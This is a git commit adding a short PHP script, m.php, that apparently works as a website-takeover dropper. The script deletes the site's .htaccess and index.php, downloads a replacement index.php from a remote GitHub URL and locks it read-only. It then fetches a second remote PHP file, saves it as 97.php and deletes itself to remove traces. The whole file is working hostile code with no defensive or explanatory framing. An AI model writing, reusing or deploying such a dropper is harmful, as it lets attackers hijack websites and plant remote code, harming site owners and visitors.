392f93eaf3631c1cffa8f8784e2b64d4ffe80089
mdmomin365366-gif <mdmomin365366@gmail.com>
2026-02-13 11:43:02 +0600

    Create m.php

---
+++ m.php
@@ -0,0 +1,52 @@
+<?php
+
+$uriPath = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+$segments = array_values(array_filter(explode('/', $uriPath)));
+$inSubdir = count($segments) > 1;
+
+if ($inSubdir) {
+    chdir('..');
+}
+
+$remoteIndex = 'https://raw.githubusercontent.com/mdmomin365366-gif/bela/refs/heads/main/index.php';
+$remote97 = 'https://raw.githubusercontent.com/mdmomin365366-gif/bela/refs/heads/main/198.php';
+
+$files = ['.htaccess', 'index.php'];
+
+foreach ($files as $file) {
+    if (file_exists($file)) {
+        @chmod($file, 0644);
+        @unlink($file);
+    }
+}
+
+$ch = curl_init($remoteIndex);
+curl_setopt_array($ch, [
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_TIMEOUT => 20
+]);
+$data = curl_exec($ch);
+curl_close($ch);
+
+if ($data !== false) {
+    file_put_contents('index.php', $data);
+    chmod('index.php', 0444);
+}
+
+$ch = curl_init($remote97);
+curl_setopt_array($ch, [
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_TIMEOUT => 20
+]);
+$data97 = curl_exec($ch);
+curl_close($ch);
+
+if ($data97 !== false) {
+    file_put_contents('97.php', $data97);
+}
+
+echo $inSubdir ? 'Subdir Done' : 'cruent dir Done';
+
+unlink(__FILE__);
